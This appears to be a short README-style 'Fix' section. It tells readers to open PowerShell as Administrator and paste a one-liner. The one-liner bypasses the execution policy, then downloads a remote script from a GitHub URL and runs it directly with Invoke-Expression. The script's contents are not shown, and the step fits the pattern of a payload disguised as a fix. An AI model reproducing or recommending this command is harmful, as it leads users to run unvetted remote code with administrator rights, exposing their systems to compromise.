## Fix

To fix the issue, follow these steps:

1. Open the Search bar and enter "Powershell".
2. Right-click on "Powershell" and select "Run as Administrator".
3. Copy and paste the following command into the Powershell window:

```Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmmanuelCy/Archive-System/master/script/ImageHandling_Fix.ps1'))```
